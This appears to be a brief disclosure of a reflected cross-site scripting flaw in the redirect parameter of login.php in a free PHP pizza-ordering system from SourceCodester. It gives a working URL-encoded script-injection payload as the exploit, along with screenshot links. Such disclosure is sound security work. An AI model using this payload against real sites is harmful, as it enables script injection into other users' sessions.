vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $redirect

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220946674-d94e1d49-8edf-4b25-b768-9f68fb407756.png)


exp

```
http://192.168.31.50/php-opos/login.php?redirect=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```

![image](https://user-images.githubusercontent.com/30823782/220946723-e20796d5-f4c0-4d26-8d77-9841fdb009e8.png)






